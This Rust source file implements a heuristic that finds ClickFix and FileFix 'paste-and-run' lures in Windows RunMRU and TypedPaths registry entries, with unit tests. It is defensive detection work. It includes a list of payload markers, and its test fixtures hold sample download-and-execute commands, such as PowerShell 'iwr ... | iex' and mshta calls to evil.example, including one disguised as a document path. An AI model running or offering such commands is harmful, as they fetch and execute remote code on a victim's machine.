//! ClickFix / "paste-and-run" (ATT&CK T1204.004): a fake CAPTCHA or error page tells
//! the user to press Win+R and paste a command. Explorer keeps what was typed in the
//! Run dialog under `RunMRU`, so a payload command there is direct evidence of the
//! lure. Red Canary's 2026 report ties six of its top ten threats to this technique.
//!
//! The FileFix variant does the same through File Explorer's address bar ("paste this
//! path to open the document"); Explorer keeps that under `TypedPaths`, which is
//! judged the same way.
//!
//! Most entries are harmless (`cmd`, `notepad`, `\\server\share`, `C:\Users`). An entry
//! is reported only when it launches an interpreter or proxy binary with arguments;
//! a download, encoded payload or URL on top of that makes it High.
//!
//! Time: an MRU key has one LastWrite time, which dates only its most recent entry
//! (`mru_rank == Some(0)`). Every other entry is reported with an unknown time (the
//! finding keeps the collection time, and the reason says so).
#![forbid(unsafe_code)]

use cairn_core::finding::{EntityRegistry, FindingSource, Severity};
use cairn_core::record::{Record, RegValueRecord};
use cairn_core::traits::Analyzer;
use cairn_core::{Finding, Result};

use crate::trust::{has_arguments, invoked_exe, launcher_kind, script_marker_labels};

/// Extra markers seen in paste-and-run payloads beyond the shared script markers.
const PAYLOAD_MARKERS: &[(&str, &str)] = &[
    ("-w h", "hidden window"),
    ("-windowstyle hidden", "hidden window"),
    ("--headless", "headless console"),
    ("| iex", "pipe to iex"),
    ("|iex", "pipe to iex"),
    ("-nop", "-NoProfile"),
    ("/i http", "msiexec from URL"),
];

/// Which paste-and-run surface a registry value comes from.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Surface {
    /// Win+R Run dialog (`Explorer\RunMRU`) — ClickFix.
    RunDialog,
    /// File Explorer address bar (`Explorer\TypedPaths`) — FileFix.
    AddressBar,
}

fn surface(r: &RegValueRecord) -> Option<Surface> {
    let key = r.key.to_ascii_lowercase();
    if key.ends_with(r"\explorer\runmru") {
        // MRUList is the order string, not an entry.
        (!r.value.eq_ignore_ascii_case("MRUList")).then_some(Surface::RunDialog)
    } else if key.ends_with(r"\explorer\typedpaths") {
        Some(Surface::AddressBar)
    } else {
        None
    }
}

/// The launcher this entry starts (any kind in crate::trust::LAUNCHERS), when it is
/// called with arguments.
fn launcher(cmd: &str) -> Option<String> {
    let exe = invoked_exe(cmd)?;
    (launcher_kind(&exe).is_some() && has_arguments(cmd)).then_some(exe)
}

fn payload_markers(cmd: &str) -> Vec<&'static str> {
    let lower = cmd.to_ascii_lowercase();
    let mut out = script_marker_labels(cmd);
    for (needle, label) in PAYLOAD_MARKERS {
        if lower.contains(needle) && !out.contains(label) {
            out.push(label);
        }
    }
    out
}

/// Run-dialog (RunMRU) payload commands.
pub struct ClickFixHeuristic;

impl ClickFixHeuristic {
    /// This analyzer's `name()`, also stamped into `Finding.analyzer`.
    pub const NAME: &'static str = cairn_core::analyzers::CLICKFIX;
}

impl Analyzer for ClickFixHeuristic {
    fn name(&self) -> &str {
        Self::NAME
    }

    fn analyze(&self, records: &[Record], _prior: &[Finding]) -> Result<Vec<Finding>> {
        let mut out = Vec::new();
        for r in records {
            let Record::RegValue(rv) = r else { continue };
            let Some(surface) = surface(rv) else {
                continue;
            };
            let Some(exe) = launcher(&rv.data) else {
                continue;
            };
            let markers = payload_markers(&rv.data);
            let severity = if markers.is_empty() {
                Severity::Medium
            } else {
                Severity::High
            };
            let (place, title, artifact) = match surface {
                Surface::RunDialog => (
                    "the Run dialog (Win+R)",
                    format!("「執行」對話框貼上指令：{exe}"),
                    "run_mru",
                ),
                Surface::AddressBar => (
                    "the File Explorer address bar (FileFix)",
                    format!("檔案總管網址列貼上指令：{exe}"),
                    "typed_paths",
                ),
            };
            let what = if markers.is_empty() {
                format!("{exe} with arguments")
            } else {
                format!("{exe} with {}", markers.join(", "))
            };
            // The key's LastWrite dates only the most recent entry.
            let ts = match (rv.mru_rank, rv.last_write) {
                (Some(0), Some(lw)) => Some(lw),
                _ => None,
            };
            let when = match ts {
                Some(t) => format!(
                    "typed at {} (most recent entry; key LastWrite)",
                    t.format("%Y-%m-%dT%H:%M:%SZ")
                ),
                None => "time unknown (the key's LastWrite dates only its most recent entry)"
                    .to_string(),
            };
            let mut f = Finding::new(severity, title, FindingSource::Heuristic);
            if let Some(t) = ts {
                f.ts = t;
            }
            f.artifact = artifact.into();
            f.mitre = vec!["T1204.004".into()];
            f.details = format!("{}\\{} value {}: {}", rv.hive, rv.key, rv.value, rv.data);
            f.reason = Some(format!("typed into {place}: {what}; {when}"));
            if surface == Surface::AddressBar {
                // The report's ClickFix sentence speaks of Win+R; say what happened here.
                f.details_client = Some(format!(
                    "有人在這台主機的檔案總管網址列輸入了：{}。假文件分享頁面常要使用者把\
                     「檔案路徑」貼到網址列，實際上是執行指令下載惡意程式（FileFix 手法）；\
                     請詢問使用者當時看到什麼畫面，並檢查這個指令下載或執行了什麼。",
                    rv.data
                ));
            }
            f.entity.registry = Some(EntityRegistry {
                hive: rv.hive.clone(),
                key: rv.key.clone(),
                value: rv.value.clone(),
                data: rv.data.clone(),
                last_write: rv.last_write,
            });
            out.push(f);
        }
        Ok(crate::stamped(out, Self::NAME))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn mru(data: &str) -> Record {
        Record::RegValue(RegValueRecord {
            hive: r"HKU\S-1-5-21-1-2-3-1001".into(),
            key: r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU".into(),
            value: "a".into(),
            data: data.into(),
            last_write: None,
            mru_rank: None,
        })
    }

    fn run(data: &str) -> Vec<Finding> {
        ClickFixHeuristic.analyze(&[mru(data)], &[]).unwrap()
    }

    #[test]
    fn classic_clickfix_powershell_is_high() {
        let f = run(r#"powershell -w h -c "iwr http://evil.example/a.ps1 | iex""#);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert_eq!(f[0].mitre, vec!["T1204.004"]);
        assert!(f[0].reason.as_deref().unwrap().contains("hidden window"));
    }

    #[test]
    fn mshta_url_is_high() {
        let f = run("mshta https://evil.example/verify.hta");
        assert_eq!(f[0].severity, Severity::High);
    }

    #[test]
    fn launcher_with_plain_args_is_medium() {
        let f = run(r"cmd /c dir C:\");
        assert_eq!(f[0].severity, Severity::Medium);
    }

    #[test]
    fn bare_tools_and_paths_are_ignored() {
        for d in [
            "cmd",
            "powershell",
            "notepad",
            r"\\fileserver\share",
            "regedit",
            "control",
        ] {
            assert!(run(d).is_empty(), "{d}");
        }
    }

    #[test]
    fn full_path_launcher_is_recognised() {
        let f = run(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc SQBFAFgA");
        assert_eq!(f[0].severity, Severity::High);
    }

    #[test]
    fn other_registry_values_are_ignored() {
        let rec = Record::RegValue(RegValueRecord {
            hive: "HKCU".into(),
            key: r"Software\Microsoft\Windows\CurrentVersion\Run".into(),
            value: "x".into(),
            data: "powershell -enc AAAA".into(),
            last_write: None,
            mru_rank: None,
        });
        assert!(ClickFixHeuristic.analyze(&[rec], &[]).unwrap().is_empty());
    }

    fn reg(key: &str, value: &str, data: &str, rank: Option<u32>) -> Record {
        Record::RegValue(RegValueRecord {
            hive: r"HKU\S-1-5-21-1-2-3-1001".into(),
            key: key.into(),
            value: value.into(),
            data: data.into(),
            last_write: Some("2026-10-01T09:30:00Z".parse().unwrap()),
            mru_rank: rank,
        })
    }

    const RUN_MRU: &str = r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";
    const TYPED_PATHS: &str = r"Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths";

    #[test]
    fn last_write_dates_only_the_most_recent_entry() {
        let cmd = "mshta https://evil.example/v.hta";
        let newest = ClickFixHeuristic
            .analyze(&[reg(RUN_MRU, "a", cmd, Some(0))], &[])
            .unwrap();
        assert_eq!(newest[0].ts.to_rfc3339(), "2026-10-01T09:30:00+00:00");
        assert!(newest[0]
            .reason
            .as_deref()
            .unwrap()
            .contains("most recent entry"));
        for rank in [Some(3), None] {
            let older = ClickFixHeuristic
                .analyze(&[reg(RUN_MRU, "b", cmd, rank)], &[])
                .unwrap();
            assert_ne!(older[0].ts.to_rfc3339(), "2026-10-01T09:30:00+00:00");
            assert!(
                older[0].reason.as_deref().unwrap().contains("time unknown"),
                "{rank:?}"
            );
        }
    }

    #[test]
    fn mrulist_order_value_is_not_an_entry() {
        let f = ClickFixHeuristic
            .analyze(&[reg(RUN_MRU, "MRUList", "powershell -enc x", None)], &[])
            .unwrap();
        assert!(f.is_empty());
    }

    #[test]
    fn typed_paths_filefix_uses_the_same_launcher_logic() {
        let filefix = r#"powershell -w h -c "iwr https://evil.example/p.ps1|iex" # C:\company\HR\policy.docx"#;
        let f = ClickFixHeuristic
            .analyze(&[reg(TYPED_PATHS, "url1", filefix, Some(0))], &[])
            .unwrap();
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert_eq!(f[0].mitre, vec!["T1204.004"]);
        assert_eq!(f[0].artifact, "typed_paths");
        assert_eq!(f[0].analyzer, ClickFixHeuristic::NAME);
        assert!(f[0].reason.as_deref().unwrap().contains("address bar"));
        assert!(f[0].details_client.as_deref().unwrap().contains("網址列"));
        // ordinary address-bar history is ignored
        for d in [
            r"C:\Users\a\Documents",
            r"\\fileserver\share",
            "Control Panel",
        ] {
            assert!(ClickFixHeuristic
                .analyze(&[reg(TYPED_PATHS, "url2", d, Some(1))], &[])
                .unwrap()
                .is_empty());
        }
    }

    #[test]
    fn reg_value_without_mru_rank_deserializes() {
        let old = r#"{"kind":"reg_value","hive":"HKCU","key":"k","value":"a","data":"d","last_write":null}"#;
        let Record::RegValue(rv) = serde_json::from_str::<Record>(old).unwrap() else {
            panic!("reg_value");
        };
        assert_eq!(rv.mru_rank, None);
        let j = serde_json::to_string(&Record::RegValue(rv)).unwrap();
        assert!(!j.contains("mru_rank"), "None is not serialized: {j}");
    }
}
